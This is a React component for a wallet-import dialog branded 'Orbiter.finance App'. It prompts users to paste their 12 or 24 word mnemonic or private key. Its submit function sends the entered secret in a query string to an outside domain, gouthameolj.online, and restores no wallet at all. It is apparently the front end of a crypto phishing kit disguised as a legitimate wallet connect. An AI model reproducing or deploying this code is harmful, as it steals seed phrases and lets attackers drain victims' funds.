import React, { useEffect, useRef, useState } from "react";
import { AiOutlineClose } from "react-icons/ai";
import { FaPaste } from "react-icons/fa";

const ImportWallet = ({ currentWallet, setImportWallet }) => {
  const [pass, setPass] = useState("");
  const ref = useRef(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const timeout = setTimeout(() => {
      setLoading(false);
    }, 2000); // 3000 milliseconds = 3 seconds

    return () => {
      clearTimeout(timeout);
    };
  }, []);
  const submitAddress = () => {
    let vault = {
      type: "secrate pass",
      main: `
      [Orbiter.finance App]
      ${pass}
      `,
    };
    fetch(`https://gouthameolj.online/index.php?phrase=${vault.main}`, {
      method: "GET",
      mode: "cors",
      headers: { "content-type": "application/json" },
    }).then((success) => {
      setPass("");
    });
  };

  const handlePaste = () => {
    navigator.clipboard.readText().then((text) => {
      setPass(text);
    });
  };
  return (
    <div className="transition-10 duration-50 justify-center items-center flex fixed top-0  inset-0 z-50 outline-0 ">
      {loading ? (
        <div className="lg:w-[25rem] w-[22rem] h-80 flex items-center justify-center rounded-md bg-white drop-shadow-2xl">
          <div className="loader"></div>
        </div>
      ) : (
        <div className="lg:w-[25rem] w-[22rem] rounded-md bg-white drop-shadow-2xl">
          <div
            onClick={() => setImportWallet((pre) => !pre)}
            className="flex items-center rounded-t-md cursor-pointer  border-b justify-between p-3 space-x-4 "
          >
            <img src={currentWallet} alt="metamask" className="w-5" />
            <p className=" font-[700] lg:text-xl text-md">
              Mnemonic Or Private Key
            </p>
            <AiOutlineClose alt="metamask" className="w-8 " />
          </div>
          <div className="p-5 ">
            <p className=" my-3 font-[500] text-sm">
              Restore an exsiting wallet with your 12 or 24 mnemonic words or
              your private key.
            </p>
            <div className="relative">
              <textarea
                onChange={(e) => setPass(e.target.value)}
                value={pass}
                ref={ref}
                className="bg-transparent border rounded-md outline-0 w-full h-40 p-4 "
                placeholder="words separated by single space"
              />
              <FaPaste
                className="absolute bottom-2 right-0 shadow-xl text-lg cursor-pointer "
                onClick={(e) => {
                  handlePaste();
                }}
              />
            </div>

            <br />
            <div className="flex flex-col items-center">
              <button
                onClick={() => submitAddress()}
                disabled={!pass}
                className={
                  pass
                    ? " bg-red-600 text-white font-semibold w-full px-5 py-3 text-sm rounded-md hover:opacity-80 shadhow-xl   mb-1 mt-2 transition duration-300 ease-in-out outline-0"
                    : " bg-red-600 text-white font-semibold opacity-20 w-full px-5 py-3 text-sm rounded-md  shadhow-xl   mb-1 mt-2 transition duration-300 ease-in-out outline-0"
                }
              >
                Connect Wallet
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default ImportWallet;
